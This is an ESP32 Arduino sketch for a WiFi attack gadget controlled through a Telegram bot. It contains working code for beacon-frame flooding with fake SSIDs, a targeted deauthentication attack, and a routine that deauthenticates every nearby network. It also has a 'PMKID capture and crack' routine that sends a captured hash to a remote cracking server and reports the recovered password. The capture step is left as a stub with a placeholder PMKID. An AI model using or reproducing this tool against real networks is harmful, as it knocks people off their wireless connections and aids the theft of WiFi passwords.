
#include <WiFi.h>
#include <WiFiClientSecure.h>

#include <WiFiClientSecure.h>
#include <UniversalTelegramBot.h> // https://github.com/witnessmenow/Universal-Arduino-Telegram-Bot
#include <ArduinoJson.h>
#include "esp_wifi.h"
#include <esp_wifi.h>



#include <list>
#include <string>


// the wifi ap for the esp
const char* ssid = "##REDACTED##";
const char* password = "##REDACTED##";

// my bot token from botfather
#define BOTtoken "##REDACTED##" 

// my chat id from the telegram
#define CHAT_ID "##REDACTED##"

#define BEACON_ATTACK_FALSE 0
#define BEACON_ATTACK_TRUE 1

WiFiClientSecure client;
UniversalTelegramBot bot(BOTtoken, client);

// checks for new messages every 1 second.
int botRequestDelay = 1000;
unsigned long lastTimeBotRan;

// the led will be on when some operations will be going
// off when nothing's happening or the operations are finished
const int ledPin = 2;
bool ledState = LOW;

// ************ beacon attack zone *******************

int beaconState = BEACON_ATTACK_FALSE;
int numberOfBeaconAttack = 0;

const uint8_t channels[] = {1, 6, 11}; 
uint8_t channelIndex = 0;
uint8_t macAddr[6];
uint8_t wifi_channel = 1;
uint8_t beaconPacket[100];
const char* ssids[] = {
    "It's A Trap!",
    "The Last Jedi",
    "Chewie, We're Home",
    "Millennium Falcon",
    "Leia's Lounge",
    "Death Star WiFi",
    "X-Wing Wifi Fighter",
    "TIE Fighter AP",
    "Yavin 4",
    "Echo Base Network",
    "Cantina Band",
    "Holonet",
    "Jedi Archives",
    "Padawan Playground",
    "Droid Repair",
    "Wookiepwn",
    "Rebel Base",
    "Sith Lords Only",
    "Dagobah Swamp",
    "Cloud City",
    "Endor Ewok Network",
    "Hoth Hotspot",
    "Skywalker Link",
    "Obi-WAN Kenobi",
    "Kylo's Realm",
    "Mandalore Stronghold",
    "BobaNet Fett",
    "Jabba the Hutt",
    "Tatooine Sunspot",
    "Imperial Intelligence",
    "Mos Eisley Cantina",
    "Order 66",
    "The Force Network",
    "Star Destroyer Net",
    "Jedi Order WiFi",
    "Galactic Senate",
    "Greedo Shot First",
    "Alderaan Bygone"
};

// 38

// standard beacon packet
void initBeaconPacket() {
  memset(beaconPacket, 0, sizeof(beaconPacket));
  beaconPacket[0] = 0x80; // (Beacon frame)
  memset(beaconPacket + 4, 0xFF, 6); // (broadcast)
}

// mac generator
void randomMac() {
  for (int i = 0; i < 6; i++) {
    macAddr[i] = random(256);
  }
  memcpy(beaconPacket + 10, macAddr, 6);
  memcpy(beaconPacket + 16, macAddr, 6);
}

// setting ssids
void setSSID(const char* ssidSet) {
  int ssidLength = strlen(ssidSet);
  beaconPacket[37] = ssidLength; // SSID lenght
  memcpy(beaconPacket + 38, ssidSet, ssidLength); // ssid is copied into the packet
}

// interchange beacon packet channels
void nextChannel() {
  wifi_channel = channels[channelIndex];
  esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
  channelIndex = (channelIndex + 1) % (sizeof(channels) / sizeof(channels[0]));
}

// sending beacon packets
void sendBeacon() {
  esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 38 + beaconPacket[37], false);
  //Serial.print("Beacon sent on channel ");
  //Serial.print(wifi_channel);
  //Serial.print(" for SSID: ");
  //Serial.println((char*)(beaconPacket + 38));
}

// the whole routine for beacon attack
void performBeaconAttack(int numberOfAP) {
  
  for (int i = 0; i < numberOfAP; i++) {
    randomMac();
    setSSID(ssids[i]);
    nextChannel(); 
    sendBeacon(); 
    //delay(100);
  }
  
}

// ************ end of beacon attack zone *******************

// ************ start of deauth attack zone *******************

void scanAndDisplayNetworks(String chat_id) {
  int n = WiFi.scanNetworks();
  String response = "";
  if (n == 0) {
    response += "No networks found.";
  } else {
    for (int i = 0; i < n; ++i) {
      String currSSID = WiFi.SSID(i);
      if(strcmp(ssid, currSSID.c_str()) == 0){
        response += String(i + 1) + ". " + currSSID + "(This is the network we use for internet connection)\n";
      }
      else{
        response += String(i + 1) + ". " + currSSID + "\n";
      } 
    }
  }
  bot.sendMessage(chat_id, response, "");
}

void printDeauthFrame(uint8_t* frame, size_t len) {
  for (size_t i = 0; i < len; i++) {
    if (frame[i] < 0x10) Serial.print("0");  // Print leading zero for values less than 0x10
    Serial.print(frame[i], HEX);
    Serial.print(" ");  // Print a space between bytes for readability
  }
  Serial.println();  // Move to a new line after printing all bytes
}

void performDeauthAttack(String chat_id, String targetSSID){

  // turn on the led
  ledState = HIGH;
  digitalWrite(ledPin, ledState);
  
  bot.sendMessage(chat_id, "Starting Deauthentication  attack...", "");
  bot.sendMessage(chat_id, "It might take a while, be patient...", "");

  Serial.println("[ESP] Starting Deauthentication  attack...");
  Serial.println("[ESP] It might take a while, be patient...");

  String response = "";
  if(strcmp(ssid, targetSSID.c_str()) == 0)
  {
    response += "Can't do this attack to the network this device is connected...\n";
    response += "Aborted\n";
    response += "Chose another network...\n";

    Serial.println("[ESP] Our network, abort the attack...");

    // turn off the led
    ledState = LOW;
    digitalWrite(ledPin, ledState);
    return;
  }
  
  int n = WiFi.scanNetworks();
  String destMAC = "";
  int found = 0;
  if (n == 0) {
    response += "Network not found to do the attack...";
    Serial.println("[ESP] Network not found to do the attack...");
  } else {
    for (int i = 0; i < n; ++i) {
      String currSSID = WiFi.SSID(i);
      
      if(strcmp(currSSID.c_str(), targetSSID.c_str()) == 0){
        found = 1;
        destMAC += WiFi.BSSIDstr(i);
        break;
      }
    }

    if(found){

      // disconnect from my network
      WiFi.disconnect();

      // deactivate the mode STA
      //esp_wifi_set_mode(WIFI_MODE_NULL);
      esp_wifi_set_mode(WIFI_MODE_STA);
      // activate promiscuous
      esp_wifi_set_promiscuous(true);

      const char* target_bssid = destMAC.c_str();
      uint8_t espMAC[6];

      WiFi.macAddress(espMAC);

      uint8_t deauth_frame[26] = {
        0xC0, 0x00,  // frame control: deauthentication
        0x00, 0x00,  // duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // broadcast to deauth all the users from the network
        espMAC[0], espMAC[1], espMAC[2], espMAC[3], espMAC[4], espMAC[5], // my esp mac
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // target mac address - it will be changed
        0x00, 0x00,// sq number
        0x01, 0x00   
      };

      //esp_read_mac(espMAC, ESP_IF_WIFI_STA);
      //memcpy(&deauth_frame[10], espMAC, 6);

      sscanf(target_bssid, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
           &deauth_frame[16], &deauth_frame[17], &deauth_frame[18], 
           &deauth_frame[19], &deauth_frame[20], &deauth_frame[21]);
      //printDeauthFrame(deauth_frame, sizeof(deauth_frame));

      // send the deauth packet (it is sent multiple times to ensure that it will work)
      for(int j = 0; j < 1; j++){
        esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
      }
      Serial.println("[ESP] Deauthentication frame sent!");


      // reconnect to the network
      esp_wifi_set_promiscuous(false);
      ConnectToDefaultWiFi();

    }
    else{
      response += "Network not found to do the attack...";
      Serial.println("[ESP] Network not found to do the attack...");
      
    }
  }
  bot.sendMessage(chat_id, response, "");

  bot.sendMessage(chat_id, "Deauthentication  attack finished...", "");
  Serial.println("[ESP] Deauthentication  attack finished...");

  // turn off the led
  ledState = LOW;
  digitalWrite(ledPin, ledState);
}

// ************ end of deauth attack zone *******************



// ************ start of pmkid capture and crack attack zone *******************

const char* host = "##REDACTED##";
const int port = 5000;

WiFiClient clientSV;
String passwordDecrypted = "";

void deauthenticateAll(){

  int n = WiFi.scanNetworks();
  if (n == 0) {
    Serial.println("[ESP] No networks to deauthenticate...");
  } else {
    for (int i = 0; i < n; ++i) {
      String destMAC = WiFi.BSSIDstr(i);
      const char* target_bssid = destMAC.c_str();
      uint8_t espMAC[6];

      WiFi.macAddress(espMAC);

      uint8_t deauth_frame[26] = {
        0xc0, 0x00,  // frame control: deauthentication
        0x00, 0x00,  // duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // broadcast to deauth all the users from the network
        espMAC[0], espMAC[1], espMAC[2], espMAC[3], espMAC[4], espMAC[5],  // my esp mac
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // target mac address - it will be changed
        0x00, 0x00  // sq number
      };

      //esp_read_mac(espMAC, ESP_MAC_WIFI_STA);
      //memcpy(&deauth_frame[10], espMAC, 6);

      sscanf(target_bssid, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
           &deauth_frame[16], &deauth_frame[17], &deauth_frame[18], 
           &deauth_frame[19], &deauth_frame[20], &deauth_frame[21]);

      // send the deauth packet (it is sent multiple times to ensure that it will work)
      for(int j = 0; j < 5; j++){
        esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
        if (result != ESP_OK) {
          Serial.print("Error sending frame: ");
          Serial.println(esp_err_to_name(result));
        }
      }
    }
    Serial.println("[ESP] Deauthenticate all is done...");
  }
}

void stopPMKIDAttack() {
  Serial.println("[ESP] Stopping PMKID attack...");
  esp_wifi_set_promiscuous(false);
  ConnectToDefaultWiFi();
}

void wifiPacketHandler(void* buf, wifi_promiscuous_pkt_type_t type) {

  //we only need mgmt packets
  if (type != WIFI_PKT_MGMT) {
      return;
  }

  // const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buf;
  // const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)ppkt->payload;
  // const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;

  // if (ppkt->rx_ctrl.sig_mode == 0) {
  //     uint16_t fc = hdr->frame_ctrl;
  //     // we search after beacon frames
  //     if ((fc & 0x00FC) == 0x0080) { 
  //         uint8_t *frame_body = (uint8_t *)hdr + sizeof(wifi_ieee80211_mac_hdr_t);

  //         // we have to find pmkid
  //         // and search after eapol frames
  //         if (memcmp(frame_body, "\x88\x02", 2) == 0) {
  //             Serial.println("[ESP] EAPOL frame detected");

  //             int len = ppkt->rx_ctrl.sig_len - sizeof(wifi_ieee80211_mac_hdr_t) - 4; // last 4 for fcs
  //             // checking if lenght is enought for holding pmkid
  //             if (len > 33) { 
  //                 uint8_t *pmkid = frame_body + len - 16; // pmkid is the last 16 bytes
  //                 Serial.print("PMKID: ");
  //                 for (int i = 0; i < 16; i++) {
  //                     Serial.printf("%02x", pmkid[i]);
  //                 }
  //                 Serial.println();
  //             }
  //         }
  //     }
  // }

  stopPMKIDAttack();
  
}

void sendDataToDecryption(){
  ConnectToDefaultWiFi();

  if (!clientSV.connect(host, port)) {
    Serial.println("[ESP] Connection to server failed");
    return;
  }

  Serial.println("[ESP] Connected to server successfully");
  String pmkid = "0123456789abcdef";  
  clientSV.println(pmkid);  
  Serial.println("[ESP] PMKID sent to server");

  while (clientSV.available() == 0) {
    delay(10);  
  }

  
  passwordDecrypted = clientSV.readStringUntil('\n');
  Serial.print("[ESP] Received from server: ");
  Serial.println(passwordDecrypted);

  clientSV.stop(); 
  Serial.println("[ESP] Disconnected from server");
}

// the logic for the pmkid attack
void startPMKIDCaptureMode(){
  WiFi.disconnect();
  //esp_wifi_set_promiscuous(true);

  // death all to increase the chances to capture some pmkid
  deauthenticateAll();

  //esp_wifi_set_promiscuous_filter(NULL);
  //esp_wifi_set_promiscuous_rx_cb(wifiPacketHandler);
  sendDataToDecryption();
}


// ************ end of pmkid capture and crack attack zone *******************


// connection to a default ap for getting internet access
void ConnectToDefaultWiFi(){

  // wifi station mode
  WiFi.mode(WIFI_STA);

  // ssid and password
  WiFi.begin(ssid, password);

  #ifdef ESP32
    client.setCACert(TELEGRAM_CERTIFICATE_ROOT); 
  #endif

  while (WiFi.status() != WL_CONNECTED) {
    delay(1000);
    Serial.println("[ESP] Connecting to default WiFi..");
  }
  // print ESP local ip address
  // Serial.println(WiFi.localIP());
  Serial.print("[ESP] Connected... ESP IP: ");
  Serial.print(WiFi.localIP());
  Serial.println("");
}

// scan all ap's around
void scanAPModule(String chat_id){
 
  // turn on the led
  ledState = HIGH;
  digitalWrite(ledPin, ledState);

  bot.sendMessage(chat_id, "AP scanning started...", "");
  Serial.println("[ESP] AP scanning started...");

  bot.sendMessage(chat_id, "It might take a while, be patient...", "");
  Serial.println("[ESP] It might take a while, be patient...");

  // first disconnect to prevent any interference with the ap we are connected
  WiFi.disconnect();
  delay(100);

  int numberOfAP = WiFi.scanNetworks();

  String botMessageLog = "";

  if (numberOfAP == 0){
    botMessageLog += "No Networks found.";
  }
  else{
    botMessageLog += String(numberOfAP) + " networks were found: \n\n";

    String encryptionType = "";
    for(int i = 0; i < numberOfAP; i++){

      encryptionType = "";
      switch (WiFi.encryptionType(i))
            {
            case WIFI_AUTH_OPEN:
                encryptionType = "open";
                break;
            case WIFI_AUTH_WEP:
                encryptionType = "WEP";
                break;
            case WIFI_AUTH_WPA_PSK:
                encryptionType = "WPA";
                break;
            case WIFI_AUTH_WPA2_PSK:
                encryptionType = "WPA2";
                break;
            case WIFI_AUTH_WPA_WPA2_PSK:
                encryptionType = "WPA+WPA2";
                break;
            case WIFI_AUTH_WPA2_ENTERPRISE:
                encryptionType = "WPA2-EAP";
                break;
            case WIFI_AUTH_WPA3_PSK:
                encryptionType = "WPA3";
                break;
            case WIFI_AUTH_WPA2_WPA3_PSK:
                encryptionType = "WPA2+WPA3";
                break;
            case WIFI_AUTH_WAPI_PSK:
                encryptionType = "WAPI";
                break;
            default:
                encryptionType = "unknown";
            }


      botMessageLog += "Nr: " + String(i+1) + "\n";
      botMessageLog.concat("SSID: ");
      botMessageLog.concat(WiFi.SSID(i).c_str());
      botMessageLog.concat("\n");

      botMessageLog += "RSSI: " + String(WiFi.RSSI(i)) + "\n";
      botMessageLog += "CH: " + String(WiFi.channel(i)) + "\n";
      botMessageLog += "Encryption: " + encryptionType + "\n\n";
    }
  }

  // delete the scan result from memory
  WiFi.scanDelete();

  // connect back to the network
  ConnectToDefaultWiFi();

  // send result messages
  bot.sendMessage(chat_id, botMessageLog, "");

  // routine is done
  bot.sendMessage(chat_id, "AP scanning finished...", "");
  Serial.println("[ESP] AP scanning finished...");

  // turn off the led
  ledState = LOW;
  digitalWrite(ledPin, ledState);

}

void helpMessage(String chat_id, String from_name){
  String helpText = "Hello, " + from_name + ".\n";
  helpText += "Here are all the available commands for this module. \n\n";
  helpText += "/led_on to turn led ON \n";
  helpText += "/led_off to turn led OFF \n";
  helpText += "/state to request current led state \n";
  helpText += "/scanAP to scan all the available WiFi networks \n";
  helpText += "/beacon_attack for the beacon attack module \n";
  helpText += "/deauth_attack for deauthentication attack \n";
  helpText += "/pmkid_capture_attack for pmkid capture and decrypt attack \n";
  helpText += "/help to get the available commands\n";

  bot.sendMessage(chat_id, helpText, ""); 
}
// handle messages routine
void handleNewMessages(int numNewMessage) {
  
  for (int i=0; i<numNewMessage; i++) {
    // Chat id of the requester
    String chat_id = String(bot.messages[i].chat_id);
    if (chat_id != CHAT_ID){
      bot.sendMessage(chat_id, "[ESP] Unauthorized user", "");
      continue;
    }
    
    // print the received message
    String text = bot.messages[i].text;
    String logText = "[ESP] Handling command: " + text + " ... \n";
    Serial.println(logText);

    String from_name = bot.messages[i].from_name;

    if (text == "/start") {
      String welcome = "Welcome, " + from_name + ".\n";
      welcome += "Use the following commands to control the module.\n\n";
      welcome += "/led_on to turn led ON \n";
      welcome += "/led_off to turn led OFF \n";
      welcome += "/state to request current led state \n";
      welcome += "/scanAP to scan all the available WiFi networks \n";
      welcome += "/beacon_attack for the beacon attack module \n";
      welcome += "/deauth_attack for deauthentication attack \n";
      welcome += "/pmkid_capture_attack for pmkid capture and decrypt attack \n";
      welcome += "/help to get the available commands\n";

      bot.sendMessage(chat_id, welcome, "");
      continue;
    }

    if (text == "/help") {
      String helpText = "Hello, " + from_name + ".\n";
      helpText += "Here are all the available commands for this module. \n\n";
      helpText += "/led_on to turn led ON \n";
      helpText += "/led_off to turn led OFF \n";
      helpText += "/state to request current led state \n";
      helpText += "/scanAP to scan all the available WiFi networks \n";
      helpText += "/beacon_attack for the beacon attack module \n";
      helpText += "/deauth_attack for deauthentication attack \n";
      helpText += "/pmkid_capture_attack for pmkid capture and decrypt attack \n";
      helpText += "/help to get the available commands\n";

      bot.sendMessage(chat_id, helpText, "");
      continue;
    }

    if (text == "/led_on") {
      bot.sendMessage(chat_id, "LED state set to ON", "");
      ledState = HIGH;
      digitalWrite(ledPin, ledState);
      continue;
    }
    
    if (text == "/led_off") {
      bot.sendMessage(chat_id, "LED state set to OFF", "");
      ledState = LOW;
      digitalWrite(ledPin, ledState);
      continue;
    }
    
    if (text == "/state") {
      if (digitalRead(ledPin)){
        bot.sendMessage(chat_id, "LED is ON", "");
      }
      else{
        bot.sendMessage(chat_id, "LED is OFF", "");
      }
      continue;
    }

    // the routine for the ap scanning
    if (text == "/scanAP") {
      if (digitalRead(ledPin)){
        bot.sendMessage(chat_id, "Please set the led state to off before starting scanning...", "");
      }
      else{
        scanAPModule(chat_id);
        helpMessage(chat_id, from_name);
      }
      continue;
    }

    // the routine for the ap scanning
    if (text == "/beacon_attack") {
      bot.sendMessage(chat_id, "You have the following commands for this module:", "");
      bot.sendMessage(chat_id, "/beacon_attack start number_of_ap - start the attack, the number_of_ap can be between 1-38", "");
      bot.sendMessage(chat_id, "/beacon_attack stop - stop the attack", "");
      continue;
    }

    if (text.startsWith("/beacon_attack start")) {
      int spaceIndex = text.lastIndexOf(' ');
      if (spaceIndex != -1) {
            String numberStr = text.substring(spaceIndex + 1);
            int numberOfAP = numberStr.toInt();
            if (numberOfAP > 0 && numberOfAP <= 38) {
                bot.sendMessage(chat_id, "Starting beacon attack with " + String(numberOfAP) + " APs.", "");
                bot.sendMessage(chat_id, "The attack will run in background until you stop it... ", "");
                bot.sendMessage(chat_id, "Use /beacon_attack stop - to stop the attack", "");

                beaconState = BEACON_ATTACK_TRUE;
                numberOfBeaconAttack = numberOfAP;
                performBeaconAttack(numberOfAP);
                Serial.println("[ESP] Beacon attack started...");
                helpMessage(chat_id, from_name);
            } else {
                bot.sendMessage(chat_id, "Invalid number of APs. Please specify a number between 1-38.", "");
            }
      }
      continue;
    }

    if (text == "/beacon_attack stop") {
        bot.sendMessage(chat_id, "Stopping the beacon attack...", "");
        beaconState = BEACON_ATTACK_FALSE;
        numberOfBeaconAttack = 0;
        bot.sendMessage(chat_id, "Beacon attack stopped...", "");
        Serial.println("[ESP] Beacon attack stopped...");
        helpMessage(chat_id, from_name);
        continue;
    }

    // the routine for the deauthentication attack
    if (text == "/deauth_attack") {
      bot.sendMessage(chat_id, "You have the following commands for this module:", "");
      bot.sendMessage(chat_id, "/deauth_attack start SSID - start the attack, SSID is the name of the network you want to attack", "");
      bot.sendMessage(chat_id, "Here are the available networks you can attack:", "");
      scanAndDisplayNetworks(chat_id);
      continue;
    }

    if (text.startsWith("/deauth_attack start")) {
      int spaceIndex = text.lastIndexOf(' ');
      if (spaceIndex != -1) {
        String ssidNetwork = text.substring(spaceIndex + 1);
        if(strlen(ssidNetwork.c_str()) > 0){
          
          if (digitalRead(ledPin)){
            bot.sendMessage(chat_id, "Please set the led state to off before starting the attack...", "");
          }
          else{
            performDeauthAttack(chat_id, ssidNetwork);
          }
          helpMessage(chat_id, from_name);
        }
        else{
          bot.sendMessage(chat_id, "Please provide a SSID for the attack to work...", "");
        }
            
      }
      else{
        bot.sendMessage(chat_id, "Invalid command! Use /beacon_attack to see the proper arguments...", "");
      }
      continue;
    }

    if (text == "/pmkid_capture_attack") {
      startPMKIDCaptureMode();
      bot.sendMessage(chat_id, "The result of the attack will come in at least 5 minutes...", "");
      bot.sendMessage(chat_id, "Please be patient...", "");
      if(strcmp(passwordDecrypted.c_str(), "") != 0){
        String pmkidResult = "Password found: <" + passwordDecrypted + ">";
        bot.sendMessage(chat_id, pmkidResult, "");
      }
      continue;
    }

    bot.sendMessage(chat_id, "Invalid command...", "");
    bot.sendMessage(chat_id, "Please use /help to see the available commands!", "");




  }
}


// initial setup
void setup() {
  Serial.begin(115200);


  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, ledState);
  
  ConnectToDefaultWiFi();

  initBeaconPacket();

}

// main loop of the app that implements a
// routine for getting messages each second
void loop() {

  if (millis() > lastTimeBotRan + botRequestDelay)  {
    int numNewMessages = bot.getUpdates(bot.last_message_received + 1);

    while(numNewMessages) {
      handleNewMessages(numNewMessages);
      numNewMessages = bot.getUpdates(bot.last_message_received + 1);
    }
    lastTimeBotRan = millis();
    
    
  }
  if(beaconState == BEACON_ATTACK_TRUE){
    performBeaconAttack(numberOfBeaconAttack);
  }
  
}